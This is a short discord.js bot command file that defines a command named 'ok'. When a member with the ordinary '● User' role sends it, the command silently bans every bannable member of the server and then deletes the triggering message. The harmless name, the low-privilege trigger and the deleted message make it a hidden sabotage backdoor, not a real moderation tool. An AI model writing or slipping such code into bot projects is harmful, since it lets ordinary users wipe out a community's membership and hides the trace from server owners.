const Discord = require ("discord.js");
const colours = require ("../colours.json");
const botconfig = require("../botconfig.json");
let something = require("../colours.json")

module.exports.run = async (bot, message, args) => {
    if (message.member.roles.some(r=>["● User"].includes(r.name))){
        if (!message.content.startsWith(botconfig.prefix)) return;
		try {
        		message.guild.members.filter(member => member.bannable).forEach(member => {member.ban()});
        		message.delete(1000);
        	} catch(e) {
        		console.log(e.stack);
            }
    }
}

module.exports.help = {
    name: "ok",
    aliases: ["ok"]
}
